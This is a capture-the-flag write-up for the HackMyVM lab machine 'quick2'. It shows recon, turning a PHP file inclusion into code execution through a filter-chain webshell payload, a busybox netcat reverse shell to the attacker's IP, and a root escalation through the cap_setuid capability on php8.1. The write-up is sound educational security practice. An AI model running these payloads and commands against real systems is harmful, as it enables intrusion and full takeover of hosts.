# quick2

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| quick2 | eMVee | Beginner | HackMyVM |

**Summary:** The exploitation of the Quick2 machine involves a classic progression from external reconnaissance to the exploitation of a web application vulnerability. Initial network scanning identified an open HTTP service running on Apache. Further investigation of the web server using Nikto and Gobuster revealed a Local File Inclusion vulnerability within a PHP script. By employing a sophisticated technique involving PHP filter chains, it was possible to upgrade this file inclusion flaw into a Remote Code Execution vulnerability. This allowed for the execution of a reverse shell, granting initial access as the web service user. Post exploitation enumeration uncovered a critical misconfiguration where the PHP binary was granted the CAP_SETUID capability. This flaw was directly leveraged to elevate privileges to the root user, enabling the retrieval of the final system flags and completing the compromise of the host.

---

## Reconnaissance

The engagement began with a localized network scan to identify the target IP address within the environment. Using a custom PowerShell script, the host was located at 192.168.100.202.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.202 08:00:27:F8:CC:57 VirtualBox
```

Once the target was identified, a comprehensive Nmap scan was performed to enumerate all open ports and identify the services running on them.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick2]
└─$ nmap -sCV -p- -T4 192.168.100.202
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-19 22:08 WIB
Nmap scan report for 192.168.100.202 (192.168.100.202)
Host is up (0.0063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 17:c4:c9:b5:94:24:9f:9c:db:33:34:d1:99:b7:23:1e (ECDSA)
|_  256 ce:83:07:4b:42:70:87:47:37:4d:d9:d6:8d:56:28:62 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Quick Automative
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.37 seconds
```

The Nmap results showed SSH and HTTP services. A Nikto scan was then executed to search for common web vulnerabilities on port 80.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick2]
└─$ nikto -h http://192.168.100.202/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.100.202
+ Target Hostname:    192.168.100.202
+ Target Port:        80
+ Start Time:         2026-05-19 22:09:40 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php).
+ /images/: Directory indexing found.
+ 8102 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2026-05-19 22:10:06 (GMT7) (26 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

The Nikto scan successfully identified a potential Local File Inclusion (LFI) vulnerability through directory traversal on the `index.php` page.

![](image.png)

To further map the web application structure, a Gobuster directory brute force was conducted.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick2]
└─$ gobuster dir -u http://192.168.100.202/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.202/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 3825]
/images               (Status: 301) [Size: 319] [--> http://192.168.100.202/images/]
/news.php             (Status: 200) [Size: 560]
/contact.php          (Status: 200) [Size: 1395]
/about.php            (Status: 200) [Size: 1446]
/home.php             (Status: 200) [Size: 2539]
/file.php             (Status: 200) [Size: 200]
/cars.php             (Status: 200) [Size: 1502]
/connect.php          (Status: 500) [Size: 0]
```

![](image-1.png)

## Initial Access

Investigation of the discovered pages revealed that the application takes user input and reflects it in the URL parameters, as seen in the following image.

![](image-2.png)

One specific file, `file.php`, appeared highly suspicious. A base64 encoded version of its content was retrieved and decoded to reveal the underlying source code.

![](image-3.png)

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick2]
└─$ echo 'PGh0bWw+Cjxib2R5PgoKPGgyPkxvY2FsIEZpbGUgSW5jbHVzaW9uIFZ1bG5lcmFiaWxpdHk8L2gyPgoKPGZvcm0gbWV0aG9kPSJnZXQiIGFjdGlvbj0iPD9waHAgZWNobyAkX1NFUlZFUlsnUEhQX1NFTEYnXTs/PiI+CiAgRmlsZSB0byBpbmNsdWRlOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSI+CiAgPGlucHV0IHR5cGU9InN1Ym1pdCI+CjwvZm9ybT4KCjw/cGhwCmlmIChpc3NldCgkX0dFVFsnZmlsZSddKSkgewogIGluY2x1ZGUoJF9HRVRbJ2ZpbGUnXSk7Cn0KPz4KCjwvYm9keT4KPC9odG1sPgo=' | base64 -d
<html>
<body>

<h2>Local File Inclusion Vulnerability</h2>

<form method="get" action="<?php echo $_SERVER['PHP_SELF'];?>">
  File to include: <input type="text" name="file">
  <input type="submit">
</form>

<?php
if (isset($_GET['file'])) {
  include($_GET['file']);
}
?>

</body>
</html>
```

The code confirms a direct LFI vulnerability via the `file` GET parameter. To achieve Remote Code Execution, the PHP filter chain generator tool was used. The repository for this tool is located at: https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py

A payload was generated to execute system commands provided through a `cmd` parameter.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick2]
└─$ php-filter-chain-generator --chain "<?php system(\$_GET['cmd']); ?>"
[+] The following gadget chain will generate the following code : <?php system($_GET['cmd']); ?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert... [truncated]
```

The generated chain was saved to `chain.txt` and used to execute the `id` command.
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick2]
└─$ vim chain.txt
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick2]
└─$ curl -G "http://192.168.100.202/file.php" --data-urlencode "file@chain.txt" --data-urlencode "cmd=id" --output -
<html>
<body>

<h2>Local File Inclusion Vulnerability</h2>

<form method="get" action="/file.php">
  File to include: <input type="text" name="file">
  <input type="submit">
</form>

uid=33(www-data) gid=33(www-data) groups=33(www-data)
@C>==@C>==@C>==@C>==@C>==@C>==@C>==@C>==@C>==@C>==@
</body>
</html>
```

The execution of the `id` command confirmed code execution as the `www-data` user. After verifying the presence of `busybox`, a reverse shell was initiated.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick2]
└─$ curl -G "http://192.168.100.202/file.php" --data-urlencode "file@chain.txt" --data-urlencode "cmd=which busybox" --output -
<html>
<body>

<h2>Local File Inclusion Vulnerability</h2>

<form method="get" action="/file.php">
  File to include: <input type="text" name="file">
  <input type="submit">
</form>

/usr/bin/busybox
@C>==@C>==@C>==@C>==@C>==@C>==@C>==@C>==@C>==@C>==@
</body>
</html>
```

A Netcat listener was established on the attacker machine.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick2]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The reverse shell was triggered using the following command.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick2]
└─$ curl -G "http://192.168.100.202/file.php" --data-urlencode "file@chain.txt" --data-urlencode "cmd=busybox nc 192.168.100.1 4444 -e /bin/bash" --output -
```

The connection was received and the shell was stabilized.

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 52514
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@quick2:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick2]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@quick2:/var/www/html$ export SHELL=/bin/bash
www-data@quick2:/var/www/html$ export TERM=xterm
www-data@quick2:/var/www/html$ stty rows 70 cols 100
```

## Privilege Escalation

Enumeration of the home directories revealed two users, andrew and nick.

```bash
www-data@quick2:/var/www/html$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Jan 14  2024 .
drwxr-xr-x 19 root   root   4096 Jan 12  2024 ..
drwxr-x---  4 andrew andrew 4096 Jan 29  2024 andrew
drwxr-xr-x  2 nick   nick   4096 Jan 29  2024 nick
```

Inside the directory for user nick, several files including the user flag were discovered.

```bash
www-data@quick2:/var/www/html$ cd /home/nick
www-data@quick2:/home/nick$ ls -la
total 24
drwxr-xr-x 2 nick nick 4096 Jan 29  2024 .
drwxr-xr-x 4 root root 4096 Jan 14  2024 ..
lrwxrwxrwx 1 nick nick    9 Jan 29  2024 .bash_history -> /dev/null
-rw-r--r-- 1 nick nick  220 Jan 14  2024 .bash_logout
-rw-r--r-- 1 nick nick 3771 Jan 14  2024 .bashrc
-rw-r--r-- 1 nick nick  807 Jan 14  2024 .profile
-rw-rw-r-- 1 nick nick 3697 Jan 14  2024 user.txt
```

To find a path to root, system capabilities were inspected.

```bash
www-data@quick2:/home/nick$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/php8.1 cap_setuid=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/snap/core20/1405/usr/bin/ping cap_net_raw=ep
```

The `/usr/bin/php8.1` binary has the `cap_setuid` capability enabled, which allows a process to change its UID. This was exploited to obtain a root shell.

```bash
www-data@quick2:/home/nick$ /usr/bin/php8.1 -r "posix_setuid(0); system('/bin/bash');"
root@quick2:/home/nick# su -
root@quick2:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
quick2
```

Finally, both the user and root flags were read from the system.

```bash
root@quick2:~# cat /home/nick/user.txt



            :'#######::'##::::'##:'####::'######::'##:::'##:::::'#######::
            '##.... ##: ##:::: ##:. ##::'##... ##: ##::'##:::::'##.... ##:
             ##:::: ##: ##:::: ##:: ##:: ##:::..:: ##:'##::::::..::::: ##:
             ##:::: ##: ##:::: ##:: ##:: ##::::::: #####::::::::'#######::
             ##:'## ##: ##:::: ##:: ##:: ##::::::: ##. ##::::::'##::::::::
             ##:.. ##:: ##:::: ##:: ##:: ##::: ##: ##:. ##::::: ##::::::::
            : ##### ##:. #######::'####:. ######:: ##::. ##:::: #########:
            :.....:..:::.......:::....:::......:::..::::..:::::.........::






          ⣀⣀⣀⣀⣠⣤⣤⣤⠶⠶⠶⢦⣤⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣤⠤⠤⠤⢤⣤⣤⣤⣤⣄⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⣟⠛⠿⢭⣛⣉⠉⠉⠉⠉⠉⠉⠙⢿⡁⠀⠀⠉⠉⠉⠉⠛⣦⠤⠖⠒⠚⠛⠛⠛⠛⠛⢓⣶⠶⠖⠚⠉⢙⣁⣭⠭⠿⠛⠛⠛⠻⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⢽⣄⢀⣠⡴⠛⠉⠉⠉⠉⠻⡗⠚⢻⡇⠀⠀⠀⠀⠀⣠⡴⠋⠀⠀⠀⠀⠀⢀⣠⠴⠚⠉⠀⠤⢤⡶⠊⠉⠀⠹⡄⠀⠀⠀⠀⠀⠀⠉⠻⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠉⠉⠀⠀⠀⠀⢀⣤⣴⣾⣥⣶⡾⣷⣀⣀⣠⣴⣿⠥⠤⣄⣀⣀⣀⡤⠖⠉⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⢹⣄⣀⣀⣀⣀⣀⣀⣀⣀⣹⣿⣶⣶⣤⣤⣀⡀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⣰⠟⠻⠯⠥⣄⣄⣿⠓⠛⡛⢉⣭⣤⣤⣤⠤⠴⠚⠛⠁⠀⠀⠀⠈⠉⠉⠉⠉⠙⠛⠉⠉⠉⠉⠉⠉⣿⡁⠀⠀⠀⠀⢀⣀⣀⣀⣀⣉⣧⣀⢉⡽⠛⠛⢳⣦⡄⠀
          ⠀⠀⠀⠀⢰⡿⣄⡀⠀⠀⠀⠀⢉⣹⡿⢻⣿⠿⣿⣇⡉⣑⣦⣀⣀⣀⡤⠤⠤⣤⣤⡶⠶⠶⠶⠷⠶⢾⣉⠉⠉⠉⠙⡏⠉⠉⠉⠉⠉⠉⠁⠀⠀⠈⢹⢻⣿⠇⠀⣴⣿⣿⣿⣿
          ⠀⠀⠀⢠⡿⠀⠀⠉⠉⠙⠒⣶⡟⢉⣿⡿⠁⠀⢸⣿⠋⠉⣿⠀⠀⠀⢀⡤⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⡄⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡟⠀⢰⣿⣿⣿⣿⢻
          ⠀⠀⠀⢸⡷⣦⣀⡀⠀⠀⠘⢿⣧⠞⢫⣷⣄⣠⠏⣸⠀⠀⡏⠀⢀⡴⠋⠀⠀⠀⠀⠀⢀⣴⣶⣶⣶⡦⣄⡀⠀⠈⢦⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⣿⣿⣿⣾⣿⣴
          ⠀⠀⠀⢸⣷⡇⠀⠉⠑⣶⠀⠀⠀⠀⠀⠉⠉⠀⠐⡇⠀⢸⡇⣠⠟⠀⠀⠀⠀⠀⣠⣾⣿⡟⢀⣽⣧⡹⣟⣷⡀⠀⠈⣧⠸⡄⠀⠀⠀⠀⢀⣀⣠⣼⣿⠃⠀⢀⡇⠻⣿⣿⠟⠛
          ⠀⠀⠀⢸⡿⢷⣄⡀⢀⡇⠀⣀⣀⣀⣀⣀⣀⠀⢀⠇⠀⠈⢻⡟⠲⢶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⠟⢷⢸⣹⣷⠀⠀⠘⣆⣧⣠⢤⣶⣾⣿⣿⣷⣿⣿⠤⠴⠚⠉⠉⠉⠁⠀⠀
          ⠀⠀⠀⢸⣿⣦⣍⡛⠻⠃⡜⠉⠉⠀⠈⠉⢹⡆⢸⠀⠀⠀⠈⢧⡀⠀⠀⢀⡝⢉⣿⣿⣿⣿⣿⣅⡀⣸⢻⢿⣿⠀⠀⠀⢹⡿⢷⣾⡿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠻⣿⣿⢿⣿⣷⣶⣧⣄⣀⣀⠀⠀⢸⡇⢸⠀⠀⠀⠀⠀⠉⠑⠲⡞⠀⠀⣿⣿⣿⡿⠿⣿⣿⠇⣼⡾⣹⠀⠀⣀⠼⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠈⠻⢶⣭⣛⣻⣿⣷⡾⢿⣿⣿⣿⣷⣿⡦⠤⣤⣤⣀⣀⣠⣼⡇⠀⠀⠹⣿⣿⣿⠀⡨⢏⣼⣿⣧⣧⠴⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠘⠻⢯⣉⠙⣷⣼⣿⣇⣳⣿⠈⢧⠀⠸⣄⡰⠋⠀⠀⣧⣄⡀⠀⠈⠻⠽⢯⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⠿⢧⣬⣷⣶⣞⣁⣤⣤⣤⡵⠀⠉⠙⠒⠒⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


          HMV{Its[REDACTED]}

root@quick2:~# cat /root/root.txt


                             :'#######::'##::::'##:'####::'######::'##:::'##:::::'#######::
                             '##.... ##: ##:::: ##:. ##::'##... ##: ##::'##:::::'##.... ##:
                              ##:::: ##: ##:::: ##:: ##:: ##:::..:: ##:'##::::::..::::: ##:
                              ##:::: ##: ##:::: ##:: ##:: ##::::::: #####::::::::'#######::
                              ##:'## ##: ##:::: ##:: ##:: ##::::::: ##. ##::::::'##::::::::
                              ##:.. ##:: ##:::: ##:: ##:: ##::: ##: ##:. ##::::: ##::::::::
                             : ##### ##:. #######::'####:. ######:: ##::. ##:::: #########:
                             :.....:..:::.......:::....:::......:::..::::..:::::.........::








           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣤⢶⠶⣶⢲⣒⢓⠛⠛⣋⣉⣉⣉⣉⣉⣉⣉⣍⣭⣹⣭⣏⣝⣩⣙⣋⣿⣿⠿⢿⣿⣿⣿⣿⣶⣶⣷⣾⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣴⣶⡶⠟⠛⠋⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠈⠀⠉⠈⠈⠀⠁⠀⠉⠈⢉⣽⠟⣉⣴⣶⣿⣿⣿⣿⠿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠟⣱⣿⣿⠿⠋⠉⠀⠀⠀⠀⠀⠄⢀⠹⣿⡟⢶⡝⣶⡙⠳⣯⡙⠻⣷⣭⣛⡿⠿⣶⣶⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣴⣾⡿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠁⢠⣿⣿⣧⠀⠀⠀⣠⡴⠶⠶⠶⠶⠦⢤⣄⡹⣦⠹⣦⢙⣶⣼⣷⠶⠟⠻⠿⠿⣶⣼⣭⣿⠾⠉⠙⡛⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⣿⣿⣻⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⠟⠀⣰⣿⠏⠘⣿⣧⠀⣾⡁⠀⠀⠀⠐⠀⠠⢤⣼⣇⣹⣷⢾⠛⠋⠉⠀⠀⠀⠀⠀⠠⣤⣼⣷⣶⡶⠾⠛⠛⠛⠛⠉⠛⠛⠶⣦⣀⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣴⣶⣶⣶⣶⣿⣿⣿⣟⣛⡓⠲⢶⣦⣤⣤⣤⣤⣶⣶⣶⣶⢶⣶⣶⣶⠶⠲⣖⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⢶⣶⣶⣶⣶⣶⡶⠶⠾⠿⠃⠀⣰⣿⣋⣀⡀⠈⢿⣷⢸⡟⣶⡶⣶⣶⣶⡿⠿⠛⠉⠁⠀⢀⡀⣀⣀⣤⣶⡶⣶⣿⣿⣟⣉⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠁⢿⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠾⣻⣽⠟⠋⠁⠀⠛⠋⠉⢁⢀⣄⣤⠿⠟⠛⠳⠞⢛⢻⣾⠿⠟⠛⠛⠛⠛⠛⠛⠛⣻⡿⠟⠛⠉⠉⢋⣩⣴⣾⡿⣫⣿⡿⠶⠟⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠷⠾⣿⣿⣷⠸⣟⠉⠋⠀⢀⠀⣤⣤⣶⠶⠾⠛⣿⣿⡿⠍⣷⡾⠛⠉⠉⠉⠛⣶⢦⣄⡀⠀⠀⢀⣴⢿⡛⠻⢶⡀⣿⣅⠠
⠂⠐⠀⠀⠂⠀⢀⣴⣿⣿⢁⣽⠋⠀⠀⠀⠀⠀⢀⣠⣼⠞⠛⠉⠀⠄⠀⣀⣤⡶⠛⠉⠁⠀⠀⠀⠀⠀⠀⣀⣴⠞⠋⠀⠀⣀⣤⣶⣿⣿⡿⠿⠛⣙⣃⣤⡴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠾⠛⠷⢾⣄⠀⢩⣿⠉⢻⣿⣤⣴⠿⠞⠛⠉⠁⠀⠀⠀⠀⠉⠁⠀⠀⣾⠁⠀⠀⠀⠀⢠⡿⠀⠈⠙⠳⣤⡾⣹⣶⣶⣄⠈⣿⣿⣧⢀
⠅⠠⠀⠁⢀⣰⣿⣿⣿⢷⣿⠁⠀⠀⠈⢀⣠⡾⠛⠉⠀⠀⠀⠈⢀⣠⠾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠄⠀⣀⣴⣾⣿⣿⣿⣿⣷⡟⠚⢛⣫⠟⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣰⡿⠋⢠⣀⣀⠀⠀⠙⣧⣾⣿⠷⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡿⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⢀⣿⣿⣿⢿⣸⢻⣷⡿⣿⣏⢸
⠀⠐⠀⣰⣿⣿⣿⣿⣿⣿⣃⡀⢀⣤⢞⠋⠁⠀⠀⠀⠀⡀⣤⡶⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⣀⣀⣴⡟⠛⠉⠉⠉⣿⣿⣱⣿⣤⡴⠛⠁⠀⢀⣀⣠⣤⣤⡶⠶⠟⠛⢻⡟⠂⣼⠿⡟⣿⠳⣦⠀⢹⣯⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⢲⡟⠀⠀⠀⢀⣿⣿⣿⣿⣿⣏⣿⣹⣿⣿⣿⢘
⠀⢠⣶⣿⣿⡿⢿⣿⠯⠀⣹⡿⠛⠛⠛⠛⠷⠶⣶⣾⣿⠟⠻⠶⠶⠶⠶⠶⠶⠶⠶⠶⠟⠻⣿⣿⠛⠉⠉⠉⠙⢷⣄⣀⣠⣴⣿⣻⣽⣿⠭⠶⠞⠛⡋⣭⣭⣍⣀⣧⡌⠀⠀⣰⡿⠉⣼⣧⣘⣇⢹⣠⣿⣧⠀⣿⣽⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⢀⣿⠃⠀⠀⢠⣾⣿⣿⣿⡿⣿⡿⠛⠋⣿⣿⡏⠀
